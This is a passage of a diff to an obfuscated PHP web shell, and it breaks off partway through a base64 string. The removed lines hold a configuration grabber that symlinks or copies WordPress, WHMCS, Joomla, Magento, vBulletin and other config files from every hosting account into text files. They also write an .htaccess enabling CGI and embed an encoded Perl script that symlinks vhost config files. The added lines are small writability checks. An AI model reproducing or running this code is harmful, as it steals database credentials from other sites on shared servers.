-    $moonafic[17]('/'.$home.'/'.$user.'/public_html/client-zone/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[17]('/'.$home.'/'.$user.'/public_html/core/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[17]('/'.$home.'/'.$user.'/public_html/company/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[17]('/'.$home.'/'.$user.'/public_html/customer/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[17]('/'.$home.'/'.$user.'/public_html/customers/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[17]('/'.$home.'/'.$user.'/public_html/bill/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[17]('/'.$home.'/'.$user.'/public_html/billing/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[17]('/'.$home.'/'.$user.'/public_html/finance/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[17]('/'.$home.'/'.$user.'/public_html/financeiro/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[17]('/'.$home.'/'.$user.'/public_html/host/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[17]('/'.$home.'/'.$user.'/public_html/hosts/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[17]('/'.$home.'/'.$user.'/public_html/hosting/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[17]('/'.$home.'/'.$user.'/public_html/hostings/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[17]('/'.$home.'/'.$user.'/public_html/klien/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[17]('/'.$home.'/'.$user.'/public_html/manage/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[17]('/'.$home.'/'.$user.'/public_html/manager/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[17]('/'.$home.'/'.$user.'/public_html/member/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[17]('/'.$home.'/'.$user.'/public_html/members/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[17]('/'.$home.'/'.$user.'/public_html/my/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[17]('/'.$home.'/'.$user.'/public_html/myaccount/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[17]('/'.$home.'/'.$user.'/public_html/my-account/client/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[17]('/'.$home.'/'.$user.'/public_html/myaccounts/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[17]('/'.$home.'/'.$user.'/public_html/my-accounts/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[17]('/'.$home.'/'.$user.'/public_html/order/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[17]('/'.$home.'/'.$user.'/public_html/orders/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[17]('/'.$home.'/'.$user.'/public_html/painel/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[17]('/'.$home.'/'.$user.'/public_html/panel/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[17]('/'.$home.'/'.$user.'/public_html/panels/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[17]('/'.$home.'/'.$user.'/public_html/portal/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[17]('/'.$home.'/'.$user.'/public_html/portals/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[17]('/'.$home.'/'.$user.'/public_html/purchase/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[17]('/'.$home.'/'.$user.'/public_html/secure/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[17]('/'.$home.'/'.$user.'/public_html/support/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[17]('/'.$home.'/'.$user.'/public_html/supporte/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[17]('/'.$home.'/'.$user.'/public_html/supports/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[17]('/'.$home.'/'.$user.'/public_html/web/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[17]('/'.$home.'/'.$user.'/public_html/webhost/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[17]('/'.$home.'/'.$user.'/public_html/webhosting/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[17]('/'.$home.'/'.$user.'/public_html/whm/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[17]('/'.$home.'/'.$user.'/public_html/whmcs/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[17]('/'.$home.'/'.$user.'/public_html/whmcs2/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[17]('/'.$home.'/'.$user.'/public_html/Whm/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[17]('/'.$home.'/'.$user.'/public_html/Whmcs/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[17]('/'.$home.'/'.$user.'/public_html/WHM/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[17]('/'.$home.'/'.$user.'/public_html/WHMCS/configuration.php',$user.'WHMCS.txt');
-    $moonafic[26]('/'.$home.'/'.$user.'/public_html/wp/test/wp-config.php',$user.'WORDPRESS.txt');
-    $moonafic[26]('/'.$home.'/'.$user.'/public_html/blog/wp-config.php',$user.'WORDPRESS.txt');
-    $moonafic[26]('/'.$home.'/'.$user.'/public_html/beta/wp-config.php',$user.'WORDPRESS.txt');
-    $moonafic[26]('/'.$home.'/'.$user.'/public_html/portal/wp-config.php',$user.'WORDPRESS.txt');
-    $moonafic[26]('/'.$home.'/'.$user.'/public_html/site/wp-config.php',$user.'WORDPRESS.txt');
-    $moonafic[26]('/'.$home.'/'.$user.'/public_html/wp/wp-config.php',$user.'WORDPRESS.txt');
-    $moonafic[26]('/'.$home.'/'.$user.'/public_html/WP/wp-config.php',$user.'WORDPRESS.txt');
-    $moonafic[26]('/'.$home.'/'.$user.'/public_html/news/wp-config.php',$user.'WORDPRESS.txt');
-    $moonafic[26]('/'.$home.'/'.$user.'/public_html/wordpress/wp-config.php',$user.'WORDPRESS.txt');
-    $moonafic[26]('/'.$home.'/'.$user.'/public_html/test/wp-config.php',$user.'WORDPRESS.txt');
-    $moonafic[26]('/'.$home.'/'.$user.'/public_html/demo/wp-config.php',$user.'WORDPRESS.txt');
-    $moonafic[26]('/'.$home.'/'.$user.'/public_html/home/wp-config.php',$user.'WORDPRESS.txt');
-    $moonafic[26]('/'.$home.'/'.$user.'/public_html/v1/wp-config.php',$user.'WORDPRESS.txt');
-    $moonafic[26]('/'.$home.'/'.$user.'/public_html/v2/wp-config.php',$user.'WORDPRESS.txt');
-    $moonafic[26]('/'.$home.'/'.$user.'/public_html/press/wp-config.php',$user.'WORDPRESS.txt');
-    $moonafic[26]('/'.$home.'/'.$user.'/public_html/new/wp-config.php',$user.'WORDPRESS.txt');
-    $moonafic[26]('/'.$home.'/'.$user.'/public_html/blogs/wp-config.php',$user.'WORDPRESS.txt');
-    $moonafic[26]('/'.$home.'/'.$user.'/public_html/blog/configuration.php',$user.'JOOMLA.txt');
-    $moonafic[26]('/'.$home.'/'.$user.'/public_html/submitticket.php',$user.'WHMCS.txt');
-    $moonafic[26]('/'.$home.'/'.$user.'/public_html/cms/configuration.php',$user.'JOOMLA.txt');
-    $moonafic[26]('/'.$home.'/'.$user.'/public_html/beta/configuration.php',$user.'JOOMLA.txt');
-    $moonafic[26]('/'.$home.'/'.$user.'/public_html/portal/configuration.php',$user.'JOOMLA.txt');
-    $moonafic[26]('/'.$home.'/'.$user.'/public_html/site/configuration.php',$user.'JOOMLA.txt');
-    $moonafic[26]('/'.$home.'/'.$user.'/public_html/main/configuration.php',$user.'JOOMLA.txt');
-    $moonafic[26]('/'.$home.'/'.$user.'/public_html/home/configuration.php',$user.'JOOMLA.txt');
-    $moonafic[26]('/'.$home.'/'.$user.'/public_html/demo/configuration.php',$user.'JOOMLA.txt');
-    $moonafic[26]('/'.$home.'/'.$user.'/public_html/test/configuration.php',$user.'JOOMLA.txt');
-    $moonafic[26]('/'.$home.'/'.$user.'/public_html/v1/configuration.php',$user.'JOOMLA.txt');
-    $moonafic[26]('/'.$home.'/'.$user.'/public_html/v2/configuration.php',$user.'JOOMLA.txt');
-    $moonafic[26]('/'.$home.'/'.$user.'/public_html/joomla/configuration.php',$user.'JOOMLA.txt');
-    $moonafic[26]('/'.$home.'/'.$user.'/public_html/new/configuration.php',$user.'JOOMLA.txt');
-    $moonafic[26]('/'.$home.'/'.$user.'/public_html/app/etc/local.xml',$user.'  MAGENTO.txt');
-    $moonafic[26]('/'.$home.'/'.$user.'/public_html/config/settings.inc.php',$user.'  PRESTASHOP.txt');
-    $moonafic[17]('/'.$home.'/'.$user.'/public_html/wp/test/wp-config.php',$user.'WORDPRESS.txt');
-    $moonafic[17]('/'.$home.'/'.$user.'/public_html/blog/wp-config.php',$user.'WORDPRESS.txt');
-    $moonafic[17]('/'.$home.'/'.$user.'/public_html/beta/wp-config.php',$user.'WORDPRESS.txt');
-    $moonafic[17]('/'.$home.'/'.$user.'/public_html/portal/wp-config.php',$user.'WORDPRESS.txt');
-    $moonafic[17]('/'.$home.'/'.$user.'/public_html/site/wp-config.php',$user.'WORDPRESS.txt');
-    $moonafic[17]('/'.$home.'/'.$user.'/public_html/wp/wp-config.php',$user.'WORDPRESS.txt');
-    $moonafic[17]('/'.$home.'/'.$user.'/public_html/WP/wp-config.php',$user.'WORDPRESS.txt');
-    $moonafic[17]('/'.$home.'/'.$user.'/public_html/news/wp-config.php',$user.'WORDPRESS.txt');
-    $moonafic[17]('/'.$home.'/'.$user.'/public_html/wordpress/wp-config.php',$user.'WORDPRESS.txt');
-    $moonafic[17]('/'.$home.'/'.$user.'/public_html/test/wp-config.php',$user.'WORDPRESS.txt');
-    $moonafic[17]('/'.$home.'/'.$user.'/public_html/demo/wp-config.php',$user.'WORDPRESS.txt');
-    $moonafic[17]('/'.$home.'/'.$user.'/public_html/home/wp-config.php',$user.'WORDPRESS.txt');
-    $moonafic[17]('/'.$home.'/'.$user.'/public_html/v1/wp-config.php',$user.'WORDPRESS.txt');
-    $moonafic[17]('/'.$home.'/'.$user.'/public_html/v2/wp-config.php',$user.'WORDPRESS.txt');
-    $moonafic[17]('/'.$home.'/'.$user.'/public_html/press/wp-config.php',$user.'WORDPRESS.txt');
-    $moonafic[17]('/'.$home.'/'.$user.'/public_html/new/wp-config.php',$user.'WORDPRESS.txt');
-    $moonafic[17]('/'.$home.'/'.$user.'/public_html/blogs/wp-config.php',$user.'WORDPRESS.txt');
-    $moonafic[17]('/'.$home.'/'.$user.'/public_html/blog/configuration.php',$user.'JOOMLA.txt');
-    $moonafic[17]('/'.$home.'/'.$user.'/public_html/submitticket.php',$user.'WHMCS.txt');
-    $moonafic[17]('/'.$home.'/'.$user.'/public_html/cms/configuration.php',$user.'JOOMLA.txt');
-    $moonafic[17]('/'.$home.'/'.$user.'/public_html/beta/configuration.php',$user.'JOOMLA.txt');
-    $moonafic[17]('/'.$home.'/'.$user.'/public_html/portal/configuration.php',$user.'JOOMLA.txt');
-    $moonafic[17]('/'.$home.'/'.$user.'/public_html/site/configuration.php',$user.'JOOMLA.txt');
-    $moonafic[17]('/'.$home.'/'.$user.'/public_html/main/configuration.php',$user.'JOOMLA.txt');
-    $moonafic[17]('/'.$home.'/'.$user.'/public_html/home/configuration.php',$user.'JOOMLA.txt');
-    $moonafic[17]('/'.$home.'/'.$user.'/public_html/demo/configuration.php',$user.'JOOMLA.txt');
-    $moonafic[17]('/'.$home.'/'.$user.'/public_html/test/configuration.php',$user.'JOOMLA.txt');
-    $moonafic[17]('/'.$home.'/'.$user.'/public_html/v1/configuration.php',$user.'JOOMLA.txt');
-    $moonafic[17]('/'.$home.'/'.$user.'/public_html/v2/configuration.php',$user.'JOOMLA.txt');
-    $moonafic[17]('/'.$home.'/'.$user.'/public_html/joomla/configuration.php',$user.'JOOMLA.txt');
-    $moonafic[17]('/'.$home.'/'.$user.'/public_html/new/configuration.php',$user.'JOOMLA.txt');
-    $moonafic[17]('/'.$home.'/'.$user.'/public_html/app/etc/local.xml',$user.'  MAGENTO.txt');
-    $moonafic[17]('/'.$home.'/'.$user.'/public_html/config/settings.inc.php',$user.'  PRESTASHOP.txt');
-    $moonafic[26]('/'.$home.'/'.$user.'/public_html/application/config/database.php',$user.'  ELLISLAB.txt');
-    $moonafic[26]('/'.$home.'/'.$user.'/public_html/admin/config.php',$user.'  OPENCART.txt');
-    $moonafic[26]('/'.$home.'/'.$user.'/public_html/default/settings.php',$user.'  DRUPAL.txt');
-    $moonafic[26]('/'.$home.'/'.$user.'/public_html/forum/config.php',$user.'  PHPBB.txt');
-    $moonafic[17]('/'.$home.'/'.$user.'/public_html/application/config/database.php',$user.'  ELLISLAB.txt');
-    $moonafic[17]('/'.$home.'/'.$user.'/public_html/admin/config.php',$user.'  OPENCART.txt');
-    $moonafic[17]('/'.$home.'/'.$user.'/public_html/default/settings.php',$user.'  DRUPAL.txt');
-    $moonafic[17]('/'.$home.'/'.$user.'/public_html/forum/config.php',$user.'  PHPBB.txt');
-    $moonafic[26]('/'.$home.'/'.$user.'/public_html/vb/includes/config.php',$user.'  VBULLETIN.txt');
-    $moonafic[26]('/'.$home.'/'.$user.'/public_html/includes/config.php',$user.'  VBULLETIN.txt');
-    $moonafic[26]('/'.$home.'/'.$user.'/public_html/forum/includes/config.php',$user.'  VBULLETIN.txt');
-    $moonafic[26]('/'.$home.'/'.$user.'/public_htm/config.php',$user.'  OTHER.txt');
-    $moonafic[26]('/'.$home.'/'.$user.'/public_htm/html/config.php',$user.'  PHPNUKE.txt');
-    $moonafic[17]('/'.$home.'/'.$user.'/public_html/vb/includes/config.php',$user.'  VBULLETIN.txt');
-    $moonafic[17]('/'.$home.'/'.$user.'/public_html/includes/config.php',$user.'  VBULLETIN.txt');
-    $moonafic[17]('/'.$home.'/'.$user.'/public_html/forum/includes/config.php',$user.'  VBULLETIN.txt');
-    $moonafic[17]('/'.$home.'/'.$user.'/public_htm/config.php',$user.'  OTHER.txt');
-    $moonafic[17]('/'.$home.'/'.$user.'/public_htm/html/config.php',$user.'  PHPNUKE.txt');
-    $moonafic[26]('/'.$home.'/'.$user.'/public_htm/conn.php',$user.'  OTHER.txt');
-    $moonafic[17]('/'.$home.'/'.$user.'/public_html/conn.php',$user.'  OTHER.txt');
-    $moonafic[17]('/'.$home.'/'.$user.'/public_html/inc/config.inc.php',$user.'  OTHER.txt');
-    $moonafic[26]('/'.$home.'/'.$user.'/public_html/application/config/database.php',$user.'  OTHER.txt');
-    $moonafic[17]('/'.$home.'/'.$user.'/public_html/application/config/database.php',$user.'  OTHER.txt');
-    $moonafic[26]('/'.$home.'/'.$user.'/public_html/inc/config.inc.php',$user.'  OTHER.txt');
-    $moonafic[26]('/var/www/wp-config.php','WORDPRESS.txt');
-    $moonafic[26]('/var/www/configuration.php','JOOMLA.txt');
-    $moonafic[26]('/var/www/config.inc.php','OPENJOURNAL.txt');
-    $moonafic[26]('/var/www/config.php','OTHER.txt');
-    $moonafic[26]('/var/www/config/koneksi.php','OTHER.txt');
-    $moonafic[26]('/var/www/include/config.php','OTHER.txt');
-    $moonafic[26]('/var/www/connect.php','OTHER.txt');
-    $moonafic[26]('/var/www/config/connect.php','OTHER.txt');
-    $moonafic[26]('/var/www/include/connect.php','OTHER.txt');
-    $moonafic[26]('/var/www/html/wp-config.php','WORDPRESS.txt');
-    $moonafic[26]('/var/www/html/configuration.php','JOOMLA.txt');
-    $moonafic[26]('/var/www/html/config.inc.php','OPENJOURNAL.txt');
-    $moonafic[26]('/var/www/html/config.php','OTHER.txt');
-    $moonafic[26]('/var/www/html/config/koneksi.php','OTHER.txt');
-    $moonafic[26]('/var/www/html/include/config.php','OTHER.txt');
-    $moonafic[26]('/var/www/html/connect.php','OTHER.txt');
-    $moonafic[26]('/var/www/html/config/connect.php','OTHER.txt');
-    $moonafic[26]('/var/www/html/include/connect.php','OTHER.txt');
-    $moonafic[17]('/var/www/wp-config.php','WORDPRESS.txt');
-    $moonafic[17]('/var/www/configuration.php','JOOMLA.txt');
-    $moonafic[17]('/var/www/config.inc.php','OPENJOURNAL.txt');
-    $moonafic[17]('/var/www/config.php','OTHER.txt');
-    $moonafic[17]('/var/www/config/koneksi.php','OTHER.txt');
-    $moonafic[17]('/var/www/include/config.php','OTHER.txt');
-    $moonafic[17]('/var/www/connect.php','OTHER.txt');
-    $moonafic[17]('/var/www/config/connect.php','OTHER.txt');
-    $moonafic[17]('/var/www/include/connect.php','OTHER.txt');
-    $moonafic[17]('/var/www/html/wp-config.php','WORDPRESS.txt');
-    $moonafic[17]('/var/www/html/configuration.php','JOOMLA.txt');
-    $moonafic[17]('/var/www/html/config.inc.php','OPENJOURNAL.txt');
-    $moonafic[17]('/var/www/html/config.php','OTHER.txt');
-    $moonafic[17]('/var/www/html/config/koneksi.php','OTHER.txt');
-    $moonafic[17]('/var/www/html/include/config.php','OTHER.txt');
-    $moonafic[17]('/var/www/html/connect.php','OTHER.txt');
-    $moonafic[17]('/var/www/html/config/connect.php','OTHER.txt');
-    $moonafic[17]('/var/www/html/include/connect.php','OTHER.txt');
+    if (is_writable($lokasi)) {
+        return "<font color='green'>Writeable</font>";
+    } else {
+        return "<font color='red'>Writeable</font>";
     }
-    echo '<center><i><b><a class="iofibrainwash" href='.$folfig.'>File Here!</a></b></i></center>';
+}
+
+function cekroot() {
+    if (is_writable($_SERVER['DOCUMENT_ROOT'])) {
+        return "<font color='green'>Writeable</font>";
+    } else {
+        return "<font color='red'>Writeable</font>";
     }
-} elseif (${$moonafic[10]}['moonatul'] == 'config') {
-    $kaliinirisu = $moonafic[22]("kaliinirisu_config", 0777);
-	$isi_htc = "Options FollowSymLinks MultiViews Indexes ExecCGI\nRequire None\nSatisfy Any\nAddType application/x-httpd-cgi .cin\nAddHandler cgi-script .cin\nAddHandler cgi-script .cin";
-	$htc = $moonafic[27]("kaliinirisu_config/.htaccess","w");
-	$moonafic[35]($htc, $isi_htc);
-	$moonafic[46]($htc);
-	if($moonafic[45]("/vhosts|vhost/", $path)) {
-		$link_config = str_replace($_SERVER['DOCUMENT_ROOT'], "", $path);
-		$vhost = "IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWluDQpvcGVuZGlyKG15ICRkaXIgLCAiL3Zhci93d3cvdmhvc3RzLyIpOw0KZm9yZWFjaChzb3J0IHJlYWRkaXIgJGRpcikgew0KICAgIG15ICRpc0RpciA9IDA7DQogICAgJGlzRGlyID0gMSBpZiAtZCAkXzsNCiRzaXRlc3MgPSAkXzsNCg0KDQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJHNpdGVzcy4nLXNob3AudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvb3MvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJHNpdGVzcy4nLXNob3Atb3MudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvb3Njb20vaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJHNpdGVzcy4nLW9zY29tLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL29zY29tbWVyY2UvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJHNpdGVzcy4nLW9zY29tbWVyY2UudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvb3Njb21tZXJjZXMvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJHNpdGVzcy4nLW9zY29tbWVyY2VzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3Nob3AvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJHNpdGVzcy4nLXNob3AyLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3Nob3BwaW5nL2luY2x1ZGVzL2NvbmZpZ3VyZS5waHAnLCRzaXRlc3MuJy1zaG9wLXNob3BwaW5nLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3NhbGUvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJHNpdGVzcy4nLXNhbGUudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvYW1lbWJlci9jb25maWcuaW5jLnBocCcsJHNpdGVzcy4nLWFtZW1iZXIudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvY29uZmlnLmluYy5waHAnLCRzaXRlc3MuJy1hbWVtYmVyMi50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9tZW1iZXJzL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictbWVtYmVycy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9jb25maWcucGhwJywkc2l0ZXNzLictNGltYWdlczEudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvZm9ydW0vaW5jbHVkZXMvY29uZmlnLnBocCcsJHNpdGVzcy4nLWZvcnVtLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2ZvcnVtcy9pbmNsdWRlcy9jb25maWcucGhwJywkc2l0ZXNzLictZm9ydW1zLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2FkbWluL2NvbmYucGhwJywkc2l0ZXNzLictNS50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9hZG1pbi9jb25maWcucGhwJywkc2l0ZXNzLictNC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy93cC1jb25maWcucGhwJywkc2l0ZXNzLictV29yZHByZXNzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3dwL3dwLWNvbmZpZy5waHAnLCRzaXRlc3MuJy1Xb3JkcHJlc3MudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvV1Avd3AtY29uZmlnLnBocCcsJHNpdGVzcy4nLVdvcmRwcmVzcy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy93cC9iZXRhL3dwLWNvbmZpZy5waHAnLCRzaXRlc3MuJy1Xb3JkcHJlc3MudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvYmV0YS93cC1jb25maWcucGhwJywkc2l0ZXNzLictV29yZHByZXNzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3ByZXNzL3dwLWNvbmZpZy5waHAnLCRzaXRlc3MuJy13cDEzLXByZXNzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3dvcmRwcmVzcy93cC1jb25maWcucGhwJywkc2l0ZXNzLictd29yZHByZXNzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL1dvcmRwcmVzcy93cC1jb25maWcucGhwJywkc2l0ZXNzLictV29yZHByZXNzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2Jsb2cvd3AtY29uZmlnLnBocCcsJHNpdGVzcy4nLVdvcmRwcmVzcy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy93b3JkcHJlc3MvYmV0YS93cC1jb25maWcucGhwJywkc2l0ZXNzLictV29yZHByZXNzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL25ld3Mvd3AtY29uZmlnLnBocCcsJHNpdGVzcy4nLVdvcmRwcmVzcy1uZXdzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL25ldy93cC1jb25maWcucGhwJywkc2l0ZXNzLictV29yZHByZXNzLW5ldy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9ibG9nL3dwLWNvbmZpZy5waHAnLCRzaXRlc3MuJy1Xb3JkcHJlc3MtYmxvZy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9iZXRhL3dwLWNvbmZpZy5waHAnLCRzaXRlc3MuJy1Xb3JkcHJlc3MtYmV0YS50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9ibG9ncy93cC1jb25maWcucGhwJywkc2l0ZXNzLictV29yZHByZXNzLWJsb2dzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2hvbWUvd3AtY29uZmlnLnBocCcsJHNpdGVzcy4nLVdvcmRwcmVzcy1ob21lLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3Byb3RhbC93cC1jb25maWcucGhwJywkc2l0ZXNzLictV29yZHByZXNzLXByb3RhbC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9zaXRlL3dwLWNvbmZpZy5waHAnLCRzaXRlc3MuJy1Xb3JkcHJlc3Mtc2l0ZS50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9tYWluL3dwLWNvbmZpZy5waHAnLCRzaXRlc3MuJy1Xb3JkcHJlc3MtbWFpbi50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy90ZXN0L3dwLWNvbmZpZy5waHAnLCRzaXRlc3MuJy1Xb3JkcHJlc3MtdGVzdC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9hcmNhZGUvZnVuY3Rpb25zL2RiY2xhc3MucGhwJywkc2l0ZXNzLictaWJwcm9hcmNhZGUudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvYXJjYWRlL2Z1bmN0aW9ucy9kYmNsYXNzLnBocCcsJHNpdGVzcy4nLWlicHJvYXJjYWRlLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2pvb21sYS9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLWpvb21sYTIudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvcHJvdGFsL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictam9vbWxhLXByb3RhbC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9qb28vY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1qb28udHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvY21zL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictam9vbWxhLWNtcy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9zaXRlL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictam9vbWxhLXNpdGUudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvbWFpbi9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLWpvb21sYS1tYWluLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL25ld3MvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1qb29tbGEtbmV3cy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9uZXcvY29u